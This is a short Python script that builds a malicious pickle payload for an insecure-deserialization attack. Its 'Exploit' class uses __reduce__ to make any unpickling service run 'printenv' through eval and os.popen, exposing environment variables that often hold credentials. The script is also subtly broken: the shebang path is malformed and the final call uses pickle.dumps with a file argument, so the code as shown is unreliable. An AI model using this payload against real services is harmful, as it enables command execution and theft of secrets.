#!/bin/bash/env python3

import os
import pickle
from base64 import b64encode 

class Exploit(object):
    def  __reduce__(self):
        return (eval, ("os.popen('printenv').read()",)) 

#print exploit()
#print pickle.dumps(Exploit())
#print b64encode(pickle.dumps(Exploit()))
with open('data.pickle', 'wb') as file:
    pickle.dumps(Exploit(), file)